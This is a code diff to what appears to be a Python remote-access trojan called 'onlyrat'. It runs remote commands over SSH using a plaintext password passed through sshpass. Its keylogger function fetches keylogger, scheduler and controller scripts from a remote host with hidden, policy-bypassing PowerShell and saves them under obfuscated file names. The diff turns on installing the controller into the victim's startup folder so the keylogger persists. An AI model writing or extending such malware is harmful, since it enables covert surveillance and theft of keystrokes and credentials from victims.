@@ -104,22 +104,21 @@ def remote_download(ipv4,pword,path_to_file,local_download_location):
     os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")
 
 def remote_command(ipv4,pword,command):
-    c = f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'"
-    print(c)
-    os.system(c)
+    os.system(f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'")
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
     keylogger_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
     scheduler_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile {temp_path}/QbaHnRAlojyG.ps1\""
+    controller_command =f"""powershell.exe -ep bypass -windowstyle hidden -c "iwr -uri {remote_path}/keylogger/controller.cmd -outfile \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\"" """
     print("[+] keylogger prepared. Ready to download....")
     print("[+] Initializing keylogger.....")
     # print(keylogger_command,'\n\n',scheduler_command,'\n\n',controller_command,'\n\n')
     remote_command(ipv4,pword,keylogger_command)
     print("[+] Initializing scheduler.....")
     remote_command(ipv4,pword,scheduler_command)
-    #print("[+] Initializing  controller.....")
-    #remote_command(ipv4,pword,controller_command)
+    print("[+] Initializing  controller.....")
+    remote_command(ipv4,pword,controller_command)
     print("[*] keylogger installed successfully")
 
 def update():
